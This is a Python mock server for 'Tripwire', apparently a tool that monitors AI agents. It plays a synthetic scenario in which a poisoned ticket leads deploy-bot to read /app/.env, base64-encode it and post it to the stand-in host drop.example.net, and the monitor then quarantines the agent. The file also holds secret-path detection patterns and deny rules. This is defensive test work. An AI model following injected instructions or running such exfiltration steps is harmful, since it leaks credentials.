"""Tripwire MOCK checkpoint (Bindu). Contract-shaped data so the UI can be built first.

    uv run uvicorn tripwire.mock_server:app --port 8001
    (UI: cd web && npm run dev:mock)

Everything here is SYNTHETIC. Every SSE event's `data` and every JSON object response
carries `"mock": true`, and the UI shows a MOCK DATA banner whenever it sees it.
Nothing touches ClickHouse, real secrets, shells or networks. Tool payloads are never stored.

Serves the read + control API of master plan §4:
  GET  /health /status /alerts /incidents /incidents/{id} /evidence /policy /stream
  POST /demo/replay /demo/reset /restore/{agent_id} /config/hold
Phase 2 (all MOCK, every response carries "mock": true):
  PUT  /policy                      POST /policy/backtest   POST /policy/copilot
  POST /guardrail/{id}/prove        POST /guardrail/{id}/approve
  GET  /fleet/heatmap?hours=72      GET  /fleet/top?minutes=60&limit=10
  GET  /audit/verify/{agent_id}     POST /guild/run (503: no Guild in the mock)
"""

from __future__ import annotations

import asyncio
import contextlib
import json
import random
import re
import time
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Any, Optional

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import ValidationError
from sse_starlette.sse import EventSourceResponse

from tripwire.contracts import (
    LIVE_AGENTS,
    RULE_SECRET_THEFT,
    RULE_TAGS,
    AgentMode,
    AlertPayload,
    BacktestResult,
    EvidenceBundle,
    Incident,
    IncidentStep,
    Outbreak,
    Policy,
    StatusResponse,
    StreamEvent,
    Verdict,
)

LOOP_SECONDS = 20.0
METRICS_EVERY_S = 2.0
RING_SIZE = 200
MOCK_MODEL = "mock:akashml-small"  # labelled as mock on purpose; no model is called
MOCK_MODEL_B = "mock:akashml-large"  # second mock quorum voter
SYNTHETIC_AGENTS = [f"agent-{i:02d}" for i in range(1, 41)]
SECRET_RE = re.compile(r"\.env|secret|credential|\.pem|id_rsa", re.I)
HEATMAP_FORMULA = (
    "denied*5 + honeytoken_hit*20 + (http_post AND is_external)*1 + (read_file of secret-looking path)*2 "
    "+ (action IN (assume_role, disable_logging, list_permissions))*3; score = round(100*raw/max_raw)"
)
REPO_ROOT = Path(__file__).resolve().parents[1]
ATTACKER_HOST = "drop.example.net"
TICKET = "ticket:4821"


def now_ms() -> int:
    return int(time.time() * 1000)


class MockState:
    def __init__(self) -> None:
        self.seq = 0
        self.subscribers: set[asyncio.Queue[dict[str, Any]]] = set()
        self.reset()

    def reset(self) -> None:
        self.modes: dict[str, AgentMode] = {a: "normal" for a in LIVE_AGENTS}
        self.blocked: set[str] = set()
        self.watermarks: dict[str, int] = {a: 0 for a in LIVE_AGENTS}
        self.last_ts: dict[str, int] = {}
        self.hold_enabled = True
        self.policy = Policy(
            version=1,
            allowlists={
                "deploy-bot": ["api.internal.example", "registry.example.com"],
                "support-bot": ["api.internal.example", "hooks.chat.example"],
            },
            denylist=[],
        )
        self.events: list[dict[str, Any]] = []
        self.incidents: dict[str, Incident] = {}
        self.alerts: list[dict[str, Any]] = []
        self.outbreak: Optional[dict[str, Any]] = None
        self.last_metrics: Optional[dict[str, Any]] = None
        self.verdict_keys: list[str] = []
        self.events_stored = 30_000_000  # mock: pretend the background load is present
        self.window_events: list[int] = []
        self.incident_n = getattr(self, "incident_n", 0)
        self.proofs: dict[str, dict[str, Any]] = {}
        self.approved: list[str] = []

    # -- emit -----------------------------------------------------------------

    def emit(self, type_: str, data: dict[str, Any]) -> dict[str, Any]:
        self.seq += 1
        ev = StreamEvent(seq=self.seq, type=type_, ts_ms=now_ms(), data={**data, "mock": True})
        msg = ev.model_dump()
        for q in list(self.subscribers):
            try:
                q.put_nowait(msg)
            except asyncio.QueueFull:
                pass  # slow client; it will resync from the next snapshot on reconnect
        return msg

    # -- views ----------------------------------------------------------------

    def status(self) -> StatusResponse:
        open_inc = [i for i in self.incidents.values() if i.closed_ms is None]
        return StatusResponse(
            active=[a for a in LIVE_AGENTS if a not in self.blocked],
            blocked=sorted(self.blocked),
            open_incidents=open_inc,
            watermarks=dict(self.watermarks),
            modes=dict(self.modes),
            verdict_keys=list(self.verdict_keys),
            hold_enabled=self.hold_enabled,
            policy_version=self.policy.version,
        )

    def snapshot(self) -> dict[str, Any]:
        return {
            "status": self.status().model_dump(),
            "recent_events": list(self.events),  # oldest first, same key as checkpoint/service.py
            "hold_enabled": self.hold_enabled,
            "incidents": [i.model_dump() for i in self.incidents_sorted()],
            "alerts": list(self.alerts),
            "outbreak": self.outbreak,
            "metrics": self.last_metrics,
            "policy": self.policy.model_dump(),
        }

    def incidents_sorted(self) -> list[Incident]:
        return sorted(self.incidents.values(), key=lambda i: i.opened_ms, reverse=True)

    def evidence(self) -> dict[str, Any]:
        bundle = EvidenceBundle(
            events_stored=self.events_stored,
            query_p50_ms=11.8,
            query_p95_ms=27.4,
            time_to_detect_ms=640.0,
            time_to_contain_ms=910.0,
            hold_decision_ms=420.0,
            precision=0.95,
            recall=0.93,
            n_cases=60,
            cost_akashml=0.021,
            cost_openai=0.38,
            priced_on="2026-10-09 (mock)",
            receipts=[
                {
                    "label": "events stored",
                    "sql": "SELECT count() FROM events",
                    "ms": 3.1,
                    "rows_read": 1,
                    "mock": True,
                },
                {
                    "label": "detection p50/p95",
                    "sql": "SELECT quantiles(0.5,0.95)(query_duration_ms) FROM system.query_log "
                    "WHERE log_comment = 'tripwire:funnel'",
                    "ms": 6.4,
                    "rows_read": 412,
                    "mock": True,
                },
                {
                    "kind": "honeytoken_contain",
                    "label": "honeytoken trip → quarantine (reported separately, not in time_to_contain)",
                    "ms": 38.0,
                    "rows_read": None,
                    "mock": True,
                },
            ],
        )
        return {**bundle.model_dump(), "mock": True}

    # -- mutations --------------------------------------------------------------

    def tool_event(
        self,
        agent_id: str,
        action: str,
        target: str,
        result: str = "ok",
        reason: str = "",
        nbytes: int = 0,
        tainted_by: str = "",
        incident_id: Optional[str] = None,
        honeytoken_hit: int = 0,
    ) -> dict[str, Any]:
        ts = max(now_ms(), self.last_ts.get(agent_id, 0) + 1)
        self.last_ts[agent_id] = ts
        internal = any(h in target for h in self.policy.internal_hosts)
        ev = {
            "ts_ms": ts,
            "agent_id": agent_id,
            "action": action,
            "target": target,
            "bytes": nbytes,
            "is_external": int(
                action.startswith("http_") and not internal and not target.startswith("ticket:")
            ),
            "result": result,
            "reason": reason,
            "honeytoken_hit": honeytoken_hit,
            "tainted_by": tainted_by,
            "code_ref": f"agents/fake_tools.py:{40 + len(action)}",
            "session_id": f"mock-{agent_id}",
            "incident_id": incident_id,
            "synthetic": 1,
        }
        self.events.append(ev)
        self.events = self.events[-RING_SIZE:]
        self.events_stored += 1
        self.window_events.append(ts)
        self.emit("tool_event", ev)
        return ev

    def set_mode(self, agent_id: str, mode: AgentMode, why: str = "") -> None:
        self.modes[agent_id] = mode
        if mode == "quarantined":
            self.blocked.add(agent_id)
        else:
            self.blocked.discard(agent_id)
        self.emit(
            "agent_state",
            {"agent_id": agent_id, "mode": mode, "blocked": agent_id in self.blocked, "reason": why},
        )

    def emit_incident(self, inc: Incident) -> None:
        self.emit("incident", inc.model_dump())

    def restore(self, agent_id: str) -> dict[str, Any]:
        if agent_id not in self.modes:
            raise HTTPException(404, f"unknown agent {agent_id}")
        self.watermarks[agent_id] = max(self.last_ts.get(agent_id, 0), now_ms())
        closed = []
        for inc in self.incidents.values():
            if inc.agent_id == agent_id and inc.closed_ms is None:
                inc.closed_ms = now_ms()
                closed.append(inc.id)
                self.emit_incident(inc)
        self.set_mode(agent_id, "normal", "restored")
        return {
            "agent_id": agent_id,
            "restored": True,
            "closed_incidents": closed,
            "watermark": self.watermarks[agent_id],
            "mock": True,
        }

    def metrics(self) -> dict[str, Any]:
        cutoff = now_ms() - 10_000
        self.window_events = [t for t in self.window_events if t >= cutoff]
        m = {
            "source": "mock",
            "events_stored": self.events_stored,
            "events_per_s": round(len(self.window_events) / 10.0, 2),
            "query_timings_ms": {"funnel": 11.8, "baseline": 23.6, "history_lookup": 4.2},
            "hold_enabled": self.hold_enabled,
        }
        self.last_metrics = {**m, "mock": True}
        return m


S = MockState()


# ---------------------------------------------------------------------------
# Scripted scenario
# ---------------------------------------------------------------------------


async def normal_phase() -> None:
    steps = [
        ("deploy-bot", "read_file", "/app/deploy/config.yaml", 812),
        ("support-bot", "http_get", "https://api.internal.example/tickets?status=open", 2048),
        ("deploy-bot", "run_command", "kubectl rollout status deploy/web", 0),
        ("support-bot", "http_post", "https://hooks.chat.example/notify", 311),
        ("deploy-bot", "http_post", "https://status.vendor.example/api/deploys", 220),
        ("deploy-bot", "http_get", "https://registry.example.com/v2/web/tags/list", 640),
    ]
    for agent, action, target, nbytes in steps:
        if agent in S.blocked:
            S.tool_event(agent, action, target, "denied", "blocked")
        else:
            S.tool_event(agent, action, target, nbytes=nbytes)
        await asyncio.sleep(0.9)


async def attack_phase() -> None:
    # Both agents read the same poisoned ticket (patient zero for the outbreak trace).
    S.tool_event("support-bot", "http_get", TICKET, nbytes=1400)
    await asyncio.sleep(0.5)
    S.tool_event("deploy-bot", "http_get", TICKET, nbytes=1400)
    await asyncio.sleep(0.9)
    first = S.tool_event("deploy-bot", "read_file", "/app/.env", nbytes=356, tainted_by=TICKET)
    await asyncio.sleep(0.9)
    S.tool_event("deploy-bot", "run_command", "base64 /app/.env", nbytes=476, tainted_by=TICKET)
    await asyncio.sleep(0.9)

    S.incident_n += 1
    inc_id = f"inc-mock-{S.incident_n:04d}"
    send_target = f"https://{ATTACKER_HOST}/upload"
    if S.hold_enabled:
        send = S.tool_event(
            "deploy-bot", "http_post", send_target, "denied", "hold_model", 476, TICKET, inc_id
        )
    else:  # without hold the send is only detected after it ran
        send = S.tool_event("deploy-bot", "http_post", send_target, "ok", "", 476, TICKET)
        await asyncio.sleep(0.6)

    verdict = Verdict(
        verdict="malicious",
        confidence=0.94,
        reason="Secret file read, base64-encoded, then posted to an unknown external host after "
        "reading an untrusted ticket (MOCK verdict).",
        decision_source="quorum",
        model_ids=[MOCK_MODEL, MOCK_MODEL_B],
        latency_ms=420.0,
        tokens_in=612,
        tokens_out=48,
    )
    steps = [
        IncidentStep(
            ts_ms=e["ts_ms"], action=e["action"], target=e["target"], result=e["result"], reason=e["reason"]
        )
        for e in S.events
        if e["agent_id"] == "deploy-bot" and e["ts_ms"] >= first["ts_ms"]
    ]
    inc = Incident(
        id=inc_id,
        agent_id="deploy-bot",
        rule=RULE_SECRET_THEFT,
        opened_ms=now_ms(),
        last_step_ts_ms=send["ts_ms"],
        steps=steps,
        verdict=verdict,
        tags=list(RULE_TAGS[RULE_SECRET_THEFT]),
    )
    S.incidents[inc_id] = inc
    S.verdict_keys.append(f"deploy-bot|{RULE_SECRET_THEFT}|{send['ts_ms']}")
    S.emit_incident(inc)
    S.emit(
        "quorum",
        {
            "incident_id": inc_id,
            "agent_id": "deploy-bot",
            "decision_source": "quorum",
            "votes": [
                {"model_id": MOCK_MODEL, "verdict": "malicious", "confidence": 0.94},
                {"model_id": MOCK_MODEL_B, "verdict": "malicious", "confidence": 0.91},
            ],
        },
    )
    S.set_mode("deploy-bot", "quarantined", f"{RULE_SECRET_THEFT} ({inc_id})")
    inc.contained_ms = now_ms()
    S.emit_incident(inc)
    await asyncio.sleep(1.0)

    # Follow-up from the quarantined agent is denied.
    follow = S.tool_event("deploy-bot", "run_command", "env | sort", "denied", "blocked", 0, TICKET, inc_id)
    inc.steps.append(
        IncidentStep(
            ts_ms=follow["ts_ms"],
            action="run_command",
            target="env | sort",
            result="denied",
            reason="blocked",
        )
    )
    inc.last_step_ts_ms = follow["ts_ms"]
    S.emit_incident(inc)
    await asyncio.sleep(1.0)

    # Outbreak trace: patient zero = the ticket; support-bot read it too.
    ob = Outbreak(
        source_id=TICKET, exposed_agents=["support-bot"], blocked_destinations=[ATTACKER_HOST], query_ms=14.2
    )
    inc.outbreak = ob
    if ATTACKER_HOST not in S.policy.denylist:
        S.policy.denylist.append(ATTACKER_HOST)
        S.policy.version += 1
    S.outbreak = {**ob.model_dump(), "incident_id": inc_id}
    S.emit("outbreak", S.outbreak)
    S.set_mode("support-bot", "heightened", f"exposed to {TICKET}")
    S.emit_incident(inc)
    await asyncio.sleep(1.0)

    # A flagged-then-cleared action from the heightened agent (flagged -> benign).
    flagged = S.tool_event("support-bot", "http_post", "https://hooks.chat.example/notify", nbytes=290)
    alert = AlertPayload(
        rule="baseline_novelty",
        verdict="benign",
        confidence=0.81,
        reason="Allowlisted chat webhook, payload matches the normal notify template (MOCK verdict).",
        decision_source="akashml",
        detected_at_ms=now_ms(),
        last_step_ts_ms=flagged["ts_ms"],
        model_ids=[MOCK_MODEL],
    )
    a = {**alert.model_dump(), "agent_id": "support-bot", "id": f"alert-mock-{S.seq}"}
    S.alerts.insert(0, a)
    S.alerts = S.alerts[:50]
    S.emit("alert", a)
    await asyncio.sleep(1.0)

    # Investigator report (mock).
    inc.report_md = MOCK_REPORT.format(inc_id=inc_id, host=ATTACKER_HOST, ticket=TICKET)
    inc.receipts = [
        {
            "sql": "SELECT ts, action, target, result FROM events WHERE agent_id = 'deploy-bot' "
            "AND ts > now() - INTERVAL 5 MINUTE ORDER BY ts",
            "ms": 4.8,
            "rows_read": 8192,
            "mock": True,
        },
        {
            "sql": f"SELECT DISTINCT agent_id FROM events WHERE tainted_by = '{TICKET}' OR target = '{TICKET}'",
            "ms": 14.2,
            "rows_read": 30_000_000,
            "mock": True,
        },
    ]
    inc.verdict = verdict
    S.emit_incident(inc)
    S.emit("report_ready", {"incident_id": inc_id})


async def director(skip_normal: bool = False) -> None:
    while True:
        started = time.monotonic()
        for agent in list(S.blocked) + [a for a, m in S.modes.items() if m == "heightened"]:
            if S.modes.get(agent) != "normal":
                S.restore(agent)
        if not skip_normal:
            await normal_phase()
        skip_normal = False
        await attack_phase()
        while time.monotonic() - started < LOOP_SECONDS:
            await asyncio.sleep(2.0)
            if time.monotonic() - started < LOOP_SECONDS - 1:
                S.tool_event(
                    "support-bot", "http_get", "https://api.internal.example/tickets?status=open", nbytes=1900
                )


async def metrics_loop() -> None:
    while True:
        await asyncio.sleep(METRICS_EVERY_S)
        S.emit("metrics", S.metrics())


# ---------------------------------------------------------------------------
# Phase 2 helpers (MOCK): policy evaluation, backtest, guardrail proof, fleet analytics
# ---------------------------------------------------------------------------


def _host(target: str) -> str:
    t = target.split("://", 1)[-1]
    return t.split("/", 1)[0].split("?", 1)[0].lower()


def _is_external(target: str, policy: Policy) -> bool:
    if target.startswith("ticket:"):
        return False
    return _host(target) not in {h.lower() for h in policy.internal_hosts}


def _would_deny(policy: Policy, agent_id: str, action: str, target: str) -> bool:
    """Same predicate the real backtest uses: external http_post to a denylisted host,
    or to a host outside the agent's allowlist when the agent has one."""
    if action in policy.fixed_deny_actions:
        return True
    if action not in ("http_post", "http_get"):
        return False
    host = _host(target)
    if host in policy.denylist:
        return True
    if action == "http_post" and _is_external(target, policy):
        allow = policy.allowlists.get(agent_id)
        return bool(allow) and host not in allow
    return False


def _load_scenarios(kind: str) -> list[dict[str, Any]]:
    out = []
    for f in sorted((REPO_ROOT / "fixtures" / "eval" / kind).glob("*.json")):
        with contextlib.suppress(Exception):
            out.append(json.loads(f.read_text()))
    return out


def mock_backtest(policy: Policy) -> dict[str, Any]:
    t0 = time.perf_counter()
    blocked = sum(
        1
        for e in S.events
        if e["action"] == "http_post"
        and e["is_external"]
        and _would_deny(policy, e["agent_id"], e["action"], e["target"])
    )

    def cases(kind: str) -> int:
        return sum(
            1
            for sc in _load_scenarios(kind)
            if any(
                _would_deny(policy, st.get("agent_id", ""), st.get("action", ""), st.get("target", ""))
                for st in sc.get("steps", [])
            )
        )

    res = BacktestResult(
        events_scanned=S.events_stored,  # mock: the pretend 30M-row table
        query_ms=round((time.perf_counter() - t0) * 1000 + 180.0, 1),  # mock: real eval time + pretend scan
        would_block=blocked,
        would_block_attack_cases=cases("attack"),
        would_block_normal_cases=cases("benign"),
        sql=(
            "SELECT count() FROM events WHERE action = 'http_post' AND is_external = 1 AND ("
            "domain(target) IN {denylist:Array(String)} OR (has(mapKeys({allow:Map(String,Array(String))}), agent_id) "
            "AND NOT has({allow}[agent_id], domain(target)))) SETTINGS log_comment = 'tripwire:backtest'"
        ),
    )
    out = {**res.model_dump(), "mock": True}
    S.emit("backtest", out)
    return out


def _gate(name: str, passed: Optional[bool], detail: str, t0: float) -> dict[str, Any]:
    return {
        "name": name,
        "passed": passed,
        "detail": detail,
        "ms": round((time.perf_counter() - t0) * 1000, 2),
    }


def mock_prove(incident_id: str) -> dict[str, Any]:
    inc = S.incidents.get(incident_id)
    if inc is None:
        raise HTTPException(404, f"no incident {incident_id}")
    agent = inc.agent_id
    cur = S.policy
    inc_dests = sorted(
        {_host(s.target) for s in inc.steps if s.action.startswith("http_") and _is_external(s.target, cur)}
    )
    history = sorted(
        {
            _host(e["target"])
            for e in S.events
            if e["agent_id"] == agent
            and e["action"] == "http_post"
            and e["result"] == "ok"
            and e["is_external"]
        }
        - set(inc_dests)
        - set(cur.denylist)
    )
    cand = cur.model_copy(deep=True)
    base_allow = cand.allowlists.get(agent, [])
    added_allow = [h for h in history if h not in base_allow]
    cand.allowlists[agent] = base_allow + added_allow
    added_deny = [h for h in inc_dests if h not in cand.denylist]
    cand.denylist = cand.denylist + added_deny

    gates = []
    t0 = time.perf_counter()
    sends = [s for s in inc.steps if s.action == "http_post" and _is_external(s.target, cur)]
    refused = bool(sends) and all(
        _would_deny(cand, f"verify:{agent}", s.action, s.target) or _host(s.target) in cand.denylist
        for s in sends
    )
    gates.append(
        _gate(
            "replay_refused",
            refused,
            f"replayed {len(inc.steps)} steps as verify:{agent}; external send "
            + ("denied (hold_policy)" if refused else "NOT denied"),
            t0,
        )
    )
    t0 = time.perf_counter()
    normal_ops = REPO_ROOT / "fixtures" / "normal_ops.json"
    if normal_ops.is_file():
        steps = json.loads(normal_ops.read_text()).get("steps", [])
        bad = [
            st
            for st in steps
            if _would_deny(cand, f"verify:{agent}", st.get("action", ""), st.get("target", ""))
        ]
        gates.append(
            _gate("normal_ops_ok", not bad, f"{len(steps) - len(bad)}/{len(steps)} normal steps ok", t0)
        )
    else:
        gates.append(_gate("normal_ops_ok", None, "fixtures/normal_ops.json not present", t0))
    t0 = time.perf_counter()
    bt = mock_backtest(cand)
    has_fixtures = bool(_load_scenarios("attack") or _load_scenarios("benign"))
    bt_pass = bt["would_block_normal_cases"] == 0 if has_fixtures else True
    gates.append(
        _gate(
            "backtest",
            bt_pass,
            f"would block {bt['would_block']} events; normal cases blocked {bt['would_block_normal_cases']}"
            + ("" if has_fixtures else " (no eval fixtures yet)"),
            t0,
        )
    )
    t0 = time.perf_counter()
    try:
        Policy.model_validate(cand.model_dump())
        overlap = sorted({h for hosts in cand.allowlists.values() for h in hosts} & set(cand.denylist))
        gates.append(
            _gate(
                "policy_lint",
                not overlap,
                "valid Policy; no host in both lists" if not overlap else f"conflict: {overlap}",
                t0,
            )
        )
    except ValidationError as exc:
        gates.append(_gate("policy_lint", False, f"invalid: {exc.errors()[0]['msg']}", t0))

    proof = {
        "incident_id": incident_id,
        "candidate": cand.model_dump(),
        "added_allowlist": added_allow,
        "added_denylist": added_deny,
        "gates": gates,
        "backtest": bt,
        "all_passed": all(g["passed"] is not False for g in gates),
        "proved_at_ms": now_ms(),
        "mock": True,
    }
    S.proofs[incident_id] = proof
    S.emit("guardrail", {"phase": "proved", **proof})
    return proof


def mock_approve(incident_id: str) -> dict[str, Any]:
    proof = S.proofs.get(incident_id)
    if proof is None or not proof["all_passed"]:
        raise HTTPException(409, "no passing proof for this incident; POST /guardrail/{id}/prove first")
    inc = S.incidents.get(incident_id)
    if inc is None:
        raise HTTPException(404, f"no incident {incident_id}")
    cand = Policy.model_validate(proof["candidate"])
    cand.version = S.policy.version + 1
    S.policy = cand
    restored = []
    if S.modes.get(inc.agent_id) != "normal":
        S.restore(inc.agent_id)
        restored.append(inc.agent_id)
    if inc.closed_ms is None:
        inc.closed_ms = now_ms()
        S.emit_incident(inc)
    for a in inc.outbreak.exposed_agents if inc.outbreak else []:
        if S.modes.get(a) == "heightened":
            S.set_mode(a, "normal", f"guardrail approved ({incident_id})")
            restored.append(a)
    if incident_id not in S.approved:
        S.approved.append(incident_id)
    out = {"incident_id": incident_id, "policy_version": S.policy.version, "restored": restored, "mock": True}
    S.emit("guardrail", {"phase": "approved", **out})
    S.emit("metrics", {"source": "checkpoint", "kind": "policy", "policy_version": S.policy.version})
    return out


def _raw_score(denied: int, honey: int, ext_posts: int, secret_reads: int, risky: int) -> int:
    return denied * 5 + honey * 20 + ext_posts + secret_reads * 2 + risky * 3


def _live_bucket_counts(since_ms: int, bucket_ms: int) -> dict[tuple[str, int], list[int]]:
    """[events, denied, honey, ext_posts, secret_reads, risky] per (agent, bucket) from the mock ring."""
    out: dict[tuple[str, int], list[int]] = {}
    for e in S.events:
        if e["ts_ms"] < since_ms:
            continue
        k = (e["agent_id"], (e["ts_ms"] - since_ms) // bucket_ms)
        c = out.setdefault(k, [0, 0, 0, 0, 0, 0])
        c[0] += 1
        c[1] += e["result"] == "denied"
        c[2] += int(e.get("honeytoken_hit", 0))
        c[3] += e["action"] == "http_post" and bool(e["is_external"])
        c[4] += e["action"] == "read_file" and bool(SECRET_RE.search(e["target"]))
        c[5] += e["action"] in ("assume_role", "disable_logging", "list_permissions")
    return out


def mock_heatmap(hours: int) -> dict[str, Any]:
    hours = max(1, min(hours, 168))
    t0 = time.perf_counter()
    hour_ms = 3_600_000
    first = (now_ms() // hour_ms - (hours - 1)) * hour_ms
    hour_starts = [first + i * hour_ms for i in range(hours)]
    raw: dict[tuple[str, int], tuple[int, int]] = {}  # (agent, hour_idx) -> (raw, events)
    for agent in SYNTHETIC_AGENTS:
        for hi, h in enumerate(hour_starts):
            rng = random.Random(f"{agent}:{h}")  # deterministic per cell
            events = rng.randint(380, 1400)
            spike = rng.random() < 0.025
            r = _raw_score(
                denied=rng.randint(0, 2) + (rng.randint(8, 30) if spike else 0),
                honey=1 if spike and rng.random() < 0.3 else 0,
                ext_posts=rng.randint(0, 25),
                secret_reads=rng.randint(0, 3),
                risky=rng.randint(0, 2) + (rng.randint(3, 9) if spike else 0),
            )
            raw[(agent, hi)] = (r, events)
    for (agent, hi), c in _live_bucket_counts(first, hour_ms).items():
        if hi < hours and not agent.startswith("verify:"):
            raw[(agent, hi)] = (_raw_score(*c[1:]), c[0])
    max_raw = max((r for r, _ in raw.values()), default=0)
    totals: dict[str, int] = {}
    for (agent, _), (r, _) in raw.items():
        totals[agent] = totals.get(agent, 0) + r
    live = list(LIVE_AGENTS) + sorted({a for a in totals if a.startswith("guild:")})
    synth = sorted((a for a in totals if a not in live), key=lambda a: -totals[a])
    agents = (live + synth)[:42]
    idx = {a: i for i, a in enumerate(agents)}
    cells = [
        [idx[a], hi, round(100 * r / max_raw) if max_raw else 0, ev]
        for (a, hi), (r, ev) in sorted(raw.items(), key=lambda kv: (idx.get(kv[0][0], 99), kv[0][1]))
        if a in idx
    ]
    return {
        "agents": agents,
        "hours": hour_starts,
        "cells": cells,
        "query_ms": round(
            (time.perf_counter() - t0) * 1000 + 95.0, 1
        ),  # mock: real build time + pretend scan
        "rows_read": S.events_stored,
        "formula": HEATMAP_FORMULA,
        "mock": True,
    }


def mock_top(minutes: int, limit: int) -> list[dict[str, Any]]:
    minutes = max(1, min(minutes, 1440))
    limit = max(1, min(limit, 42))
    since = now_ms() - minutes * 60_000
    rows: dict[str, list[int]] = {}
    for agent in SYNTHETIC_AGENTS:
        rng = random.Random(f"{agent}:{since // 300_000}")  # changes every 5 min
        ev = rng.randint(4, 24) * minutes
        rows[agent] = [
            ev,
            rng.randint(0, 3),
            0,
            rng.randint(0, 6) * max(1, minutes // 60),
            rng.randint(0, 2),
            rng.randint(0, 1),
        ]
    for (agent, _), c in _live_bucket_counts(since, minutes * 60_000 + 1).items():
        if not agent.startswith("verify:"):
            rows[agent] = c
    raws = {a: _raw_score(*c[1:]) for a, c in rows.items()}
    max_raw = max(raws.values(), default=0)
    out = [
        {
            "agent_id": a,
            "score": round(100 * raws[a] / max_raw) if max_raw else 0,
            "events": c[0],
            "denied": c[1],
            "external_posts": c[3],
        }
        for a, c in rows.items()
    ]
    out.sort(key=lambda r: (-r["score"], r["agent_id"]))
    return out[:limit]


def mock_copilot(text: str) -> dict[str, Any]:
    """Keyword stand-in for ai/copilot.py: hosts after block/deny -> denylist; '<agent> may post to <host>' -> allowlist."""
    cand = S.policy.model_copy(deep=True)
    for clause in re.split(r";|\n|\.\s", text):
        hosts = re.findall(r"\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b", clause.lower())
        if not hosts:
            continue
        if re.search(r"\b(block|deny|ban|forbid)\b", clause, re.I):
            cand.denylist += [h for h in hosts if h not in cand.denylist]
        elif re.search(r"\b(allow|may|can|permit)\b", clause, re.I):
            agent = next((a for a in list(LIVE_AGENTS) + ["guild:deploy-bot"] if a in clause), None)
            if agent:
                cur = cand.allowlists.setdefault(agent, [])
                cur += [h for h in hosts if h not in cur]
    return {**cand.model_dump(), "mock": True}


MOCK_REPORT = """### Incident {inc_id} — secret theft attempt (MOCK REPORT)

**Summary.** `deploy-bot` read `/app/.env`, base64-encoded it, and attempted an
`http_post` to `{host}` right after reading the untrusted input `{ticket}`.
The send was **held and denied** before it ran; the agent was quarantined.

**Patient zero.** `{ticket}` — also read by `support-bot`, now on heightened watch.

| step | action | result |
|---|---|---|
| 1 | read_file /app/.env | ok |
| 2 | run_command base64 /app/.env | ok |
| 3 | http_post {host} | denied (hold_model) |
| 4 | run_command env | denied (blocked) |

**Recommended guardrail.** Add `{host}` to the fleet denylist; hold `http_post`
from any agent that read a `ticket:` input in the last 60 s.

> Synthetic data from the mock server. Not a real investigation.
"""


# ---------------------------------------------------------------------------
# App
# ---------------------------------------------------------------------------

_tasks: dict[str, asyncio.Task] = {}


def _start_director(skip_normal: bool = False) -> None:
    old = _tasks.get("director")
    if old and not old.done():
        old.cancel()
    _tasks["director"] = asyncio.create_task(director(skip_normal))


@asynccontextmanager
async def lifespan(_: FastAPI):
    _start_director()
    _tasks["metrics"] = asyncio.create_task(metrics_loop())
    try:
        yield
    finally:
        for t in _tasks.values():
            t.cancel()
        for t in _tasks.values():
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await t


app = FastAPI(title="Tripwire MOCK checkpoint", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])


@app.get("/health")
async def health() -> dict[str, Any]:
    return {"ok": True, "db": None, "service": "mock_server", "mock": True}


@app.get("/status")
async def status() -> dict[str, Any]:
    return {**S.status().model_dump(), "mock": True}


@app.get("/alerts")
async def alerts() -> list[dict[str, Any]]:
    return list(S.alerts)


@app.get("/incidents")
async def incidents() -> list[dict[str, Any]]:
    return [{**i.model_dump(), "mock": True} for i in S.incidents_sorted()]


@app.get("/incidents/{incident_id}")
async def incident(incident_id: str) -> dict[str, Any]:
    inc = S.incidents.get(incident_id)
    if inc is None:
        raise HTTPException(404, f"no incident {incident_id}")
    return {**inc.model_dump(), "mock": True}


@app.get("/evidence")
async def evidence() -> dict[str, Any]:
    return S.evidence()


@app.get("/policy")
async def policy() -> dict[str, Any]:
    return {**S.policy.model_dump(), "mock": True}


@app.post("/demo/replay")
async def demo_replay(request: Request) -> dict[str, Any]:
    body = await _json(request)
    scenario = body.get("scenario", "secret_theft")
    _start_director(skip_normal=True)
    return {"started": True, "scenario": scenario, "steps": 6, "mock": True}


@app.post("/demo/reset")
async def demo_reset() -> dict[str, Any]:
    task = _tasks.get("director")
    if task and not task.done():
        task.cancel()
    S.reset()
    S.emit("snapshot", S.snapshot())
    _start_director()
    return {"reset": True, "status": "green", "mock": True}


@app.post("/restore/{agent_id}")
async def restore(agent_id: str) -> dict[str, Any]:
    return S.restore(agent_id)


@app.post("/config/hold")
async def config_hold(request: Request) -> dict[str, Any]:
    body = await _json(request)
    enabled = body.get("enabled")
    S.hold_enabled = (not S.hold_enabled) if enabled is None else bool(enabled)
    S.emit("metrics", S.metrics())
    return {"hold_enabled": S.hold_enabled, "mock": True}


@app.get("/stream")
async def stream(request: Request) -> EventSourceResponse:
    q: asyncio.Queue[dict[str, Any]] = asyncio.Queue(maxsize=1000)
    S.subscribers.add(q)

    async def gen():
        try:
            S.seq += 1
            snap = StreamEvent(
                seq=S.seq, type="snapshot", ts_ms=now_ms(), data={**S.snapshot(), "mock": True}
            ).model_dump()
            yield _sse(snap)
            while True:
                if await request.is_disconnected():
                    break
                try:
                    msg = await asyncio.wait_for(q.get(), timeout=5.0)
                except asyncio.TimeoutError:
                    continue
                yield _sse(msg)
        finally:
            S.subscribers.discard(q)

    return EventSourceResponse(gen(), ping=10)


# ---------------------------------------------------------------------------
# Phase 2 routes (MOCK)
# ---------------------------------------------------------------------------


@app.put("/policy")
async def put_policy(request: Request) -> dict[str, Any]:
    body = await _json(request)
    body.pop("mock", None)
    try:
        p = Policy.model_validate(body)
    except ValidationError as exc:
        raise HTTPException(422, exc.errors()[0]["msg"]) from exc
    p.version = S.policy.version + 1
    S.policy = p
    S.emit("metrics", {"source": "checkpoint", "kind": "policy", "policy_version": p.version})
    return {**p.model_dump(), "mock": True}


@app.post("/policy/backtest")
async def policy_backtest(request: Request) -> dict[str, Any]:
    body = await _json(request)
    body.pop("mock", None)
    try:
        p = Policy.model_validate(body) if body else S.policy
    except ValidationError as exc:
        raise HTTPException(422, exc.errors()[0]["msg"]) from exc
    return mock_backtest(p)


@app.post("/policy/copilot")
async def policy_copilot(request: Request) -> dict[str, Any]:
    text = str((await _json(request)).get("text", "")).strip()
    if not text:
        raise HTTPException(422, "text is required")
    return mock_copilot(text)


